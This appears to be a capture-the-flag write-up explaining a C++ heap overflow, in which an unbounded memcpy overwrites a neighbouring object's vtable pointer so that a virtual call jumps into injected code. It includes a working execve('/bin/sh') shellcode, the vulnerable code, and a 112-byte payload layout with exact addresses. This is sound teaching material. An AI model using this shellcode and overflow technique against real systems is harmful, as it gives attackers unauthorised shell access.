
# Vulnerability Summary

## What is Shellcode?

**Shellcode** is small machine code that, when executed, spawns a shell (`/bin/sh`).

Example (21 bytes):
```
\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
```

This is raw assembly instructions that:
1. Set up registers for `execve` system call
2. Load `/bin/sh` as argument
3. Execute the system call
4. Result: shell spawns

## Why use Shellcode?

- No `system("/bin/sh")` in program
- No helper function like `run()` or `m()`
- We need to inject our own executable code

## How the program works (C++)

```cpp
class N {
    int value;
    char annotation[100];
    void setAnnotation(char *s) {
        memcpy(annotation, s, strlen(s));  // VULNERABLE!
    }
};

int main(int argc, char **argv) {
    N *obj1 = new N(5);
    N *obj2 = new N(6);
    obj1->setAnnotation(argv[1]);
    obj2->operator+(*obj1);  // Uses vtable pointer
}
```

## The Vulnerability

`memcpy` copies without size limit. If input > 108 bytes, it overflows into object 2 and overwrites its **vtable pointer**.

## What is a Vtable?

In C++, objects with virtual functions have a **vtable pointer** that points to a table of function addresses.

When calling a virtual function:
```asm
mov (%eax), %edx    ; Read address from vtable
call *%edx          ; Jump to that address
```

## The Attack

1. Overflow from object 1 into object 2
2. Overwrite object 2's vtable pointer
3. Point it to our shellcode
4. When program calls virtual function → executes shellcode

## Memory Layout

```
Object 1 (0x804a008):
[vtable ptr][data buffer.........................]

Object 2 (0x804a078):
[vtable ptr][data buffer.........................]
     ↑
  We overwrite this
```

## The Payload Structure

```
[ptr to shellcode] + [shellcode] + [padding] + [ptr to start]
     4 bytes          21 bytes     83 bytes      4 bytes
     
0x804a00c: 0x804a010  ← Points to shellcode
0x804a010: [shellcode] ← Our malicious code
0x804a025: AAAA...     ← Padding (83 bytes)
0x804a078: 0x804a00c   ← Overwrites vtable, points back
```

**Total:** 4 + 21 + 83 + 4 = 112 bytes

## Execution Flow

1. Program copies our 112 bytes with `memcpy`
2. Overflow reaches object 2's vtable pointer
3. Vtable pointer now = `0x804a00c`
4. Program does `call *%edx`
5. Reads `0x804a00c` → finds `0x804a010`
6. Jumps to `0x804a010` → our shellcode
7. Shellcode executes `/bin/sh`
8. **Shell as bonus0!**